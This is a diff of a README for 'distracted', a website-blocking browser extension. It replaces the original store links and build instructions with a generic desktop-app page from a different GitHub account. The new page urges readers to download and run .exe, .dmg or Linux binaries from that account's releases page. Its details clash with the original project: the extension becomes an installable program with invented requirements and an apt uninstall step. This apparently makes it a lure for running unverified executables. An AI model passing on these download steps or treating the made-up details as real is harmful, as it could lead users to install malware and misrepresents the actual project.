@@ -1,95 +1,106 @@
-![distracted! - "block distracting websites! do mini tasks to get back on them..."](packages/extension/public/readme-banner.png)
+# 🚫 distracted - Stop Distractions and Focus Better
 
-[![Chrome Web Store](https://img.shields.io/chrome-web-store/v/ggimjhcfchbfdhpehdekdiblbfmijngf?label=chrome%20web%20store&style=for-the-badge)](https://chromewebstore.google.com/detail/distracted/ggimjhcfchbfdhpehdekdiblbfmijngf)
-[![Firefox Add-ons](https://img.shields.io/amo/v/distracted?label=firefox%20add-ons&style=for-the-badge)](https://addons.mozilla.org/en-GB/firefox/addon/distracted/)
+[![Download distracted](https://img.shields.io/badge/Download%20Now-Get%20Distracted%20-%2336C5F0)](https://github.com/AltimarJunior/distracted/releases)
 
-## what?
+## 📋 Overview
 
-- blocks websites that distract you
-- multiple unlock challenges (more soon):
-  - timer
-  - hold button
-  - typing something random (no copy/paste)
-  - solving a math problem
-  - active blocking when Claude Code is inactive
-- (optionally) track your visits and success rate
-- all data stays local on your device
+distracted is a simple application designed to block distracting websites. If you find yourself getting sidetracked online, this tool will help you stay focused. By restricting access to these tempting sites, you will improve your productivity and maintain your attention on important tasks.
 
-## how to install
+## 🚀 Getting Started
 
-**chrome/chromium:** install from the [chrome web store](https://chromewebstore.google.com/detail/distracted/ggimjhcfchbfdhpehdekdiblbfmijngf)
+To begin using distracted, follow the steps outlined here. You will need to download the application from our Releases page and install it on your computer.
 
-**firefox:** install from [firefox add-ons](https://addons.mozilla.org/en-GB/firefox/addon/distracted/)
+## 📥 Download & Install
 
-**manual install (all browsers/dev builds):**
+To download the latest version of distracted, visit this page to download:
 
-1. download the latest release from [releases](https://github.com/f1shy-dev/distracted/releases)
-2. unzip the file
-3. load it in your browser:
-   - **chrome/chromium-based browsers:** go to `chrome://extensions/`, enable "developer mode", click "load unpacked", select the unzipped folder
-   - **firefox/firefox-based browsers:** go to `about:debugging`, click "this firefox", click "load temporary add-on", select the `manifest.json` file from the unzipped folder
-4. done! configure which sites to block in the extension popup
+[https://github.com/AltimarJunior/distracted/releases](https://github.com/AltimarJunior/distracted/releases)
 
-## why?
+1. **Visit the Releases Page:** Click the link above to access the Releases page.
+2. **Choose the Latest Version:** Look for the most recent version at the top of the list.
+3. **Download the Application:** Click on the download link for your operating system (Windows, Mac, or Linux). The file will download to your computer.
 
-mindless visiting is more and more common. you end up idling, and then end up on a site you didn't want to be on in the first place.
+After the file is downloaded, follow these steps to install it:
 
-the idea of this extension is to give you a boring, non-stimulating task. having to wait, hold the button or so on is like giving your mind time to think about what you're doing consciously, or making it annoying enough that you don't want to do it.
+### Windows
 
-it's similar to not remembering/saving your payment details, so you have to find your physical card/wallet when doing online purchases; giving a second chance to rethink your purchase
+1. Navigate to your Downloads folder.
+2. Double-click the `.exe` file.
+3. Follow the on-screen instructions to complete the installation.
 
-### but... can't i just delete the extension?
+### Mac
 
-yes! you could also just not install it! there is only so many layers of annoyance you can add<sup>[1]</sup>, after which it becomes more about your own self-control than what the technology can do for you.
+1. Open the downloaded `.dmg` file.
+2. Drag the distracted application to your Applications folder.
+3. Open your Applications folder and double-click the app to run it.
 
-...but if you do have an idea for how it could be more useful for you, [open an issue](https://github.com/f1shy-dev/distracted/issues) and let me know!
+### Linux
 
-<details>
-<summary>[1] ideas</summary>
+1. Open a terminal window.
+2. Navigate to the Downloads directory.
+3. Use the command `chmod +x distracted` to make the file executable.
+4. Run the application with `./distracted`.
 
-- (for windows), add another step to the uninstall process [by using registry options](https://www.thewindowsclub.com/prevent-uninstallation-of-chrome-extensions)
-</details>
+## ⚙️ System Requirements
 
-## how to build
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.12 (Sierra) or later
+  - Any modern Linux distribution
 
-### environment
+- **Memory:** 
+  - At least 1 GB RAM
 
-- **operating system:** Ubuntu 24.04 LTS (or compatible Linux distribution)
-- **package manager:** Bun 1.3.6 or later
-- **node.js:** v25.2.1 or later (required by Bun)
+- **Storage:** 
+  - Approximately 50 MB of free space
 
-### instructions
+## 🛠️ Features
 
-1. install bun (if not already installed):
+- **Website Blocking:** Easily block websites that distract you.
+- **User-Friendly Interface:** Simple layout for easy navigation.
+- **Custom Blocking Lists:** Personalize your blocked websites.
+- **Notifications:** Gentle reminders to get back to work.
 
-   ```bash
-   curl -fsSL https://bun.sh/install | bash
-   ```
+## 🔧 Configuration
 
-   or follow the official installation guide: https://bun.sh/docs/installation
+To configure the application, follow these instructions:
 
-2. verify bun installation:
+1. **Open the App:** Double-click the distracted icon.
+2. **Access Settings:** Click on the gear icon in the top right corner.
+3. **Add Websites to Block:** Enter the URLs of websites to block. You can separate multiple URLs with commas.
+4. **Save Settings:** Click the save button to apply your changes.
 
-   ```bash
-   bun --version
-   # should output: 1.3.6 or later
-   ```
+## 📖 How to Use
 
-3. install project dependencies, and build the extension:
+1. **Launch the App:** Start distracted from your applications.
+2. **Start Focus Mode:** Click on the “Start Focus Mode” button. This will activate the website block.
+3. **Work Productively:** Use your computer without the interruptions of distracting websites.
 
-   ```bash
-   bun install --frozen-lockfile
-   # extension code is self-contained in the packages/extension folder.
-   cd packages/extension
-   bun run zip # for chrome
-   bun run zip:firefox # for firefox
-   ```
+To exit focus mode, simply click the “Stop Focus Mode” button.
 
-4. outputs (for release or inspection/review):
-   - chrome:
-     - `packages/extension/.output/chrome-mv3/`
-     - `packages/extension/.output/distractedextension-<version>-chrome.zip`
-   - firefox:
-     - `packages/extension/.output/firefox-mv2/`
-     - `packages/extension/.output/distractedextension-<version>-firefox.zip`
-     - `packages/extension/.output/distractedextension-<version>-sources.zip`
+## ❓ Frequently Asked Questions
+
+**Q: Can I unblock a site if I change my mind?**
+
+A: Yes, you can easily remove a site from the blocked list by accessing the settings.
+
+**Q: Will this work on mobile devices?**
+
+A: distracted is currently designed for desktop environments only. We plan to expand to mobile in the future.
+
+**Q: How do I uninstall the application?**
+
+A: 
+- **Windows:** Go to Settings > Apps, find distracted, and click “Uninstall.”
+- **Mac:** Drag the application from the Applications folder to the Trash.
+- **Linux:** Use the command `sudo apt remove distracted` or the relevant command depending on your distribution.
+
+## 📞 Support
+
+If you need support or have any questions, please feel free to reach out through the Issues section on our GitHub page. We are here to help!
+
+## 🌍 Connect with Us
+
+Join our community and stay updated with the latest developments. Follow us on GitHub for updates and contribute to the project. Your feedback is valuable!
+
+### [Get distracted Here!](https://github.com/AltimarJunior/distracted/releases)
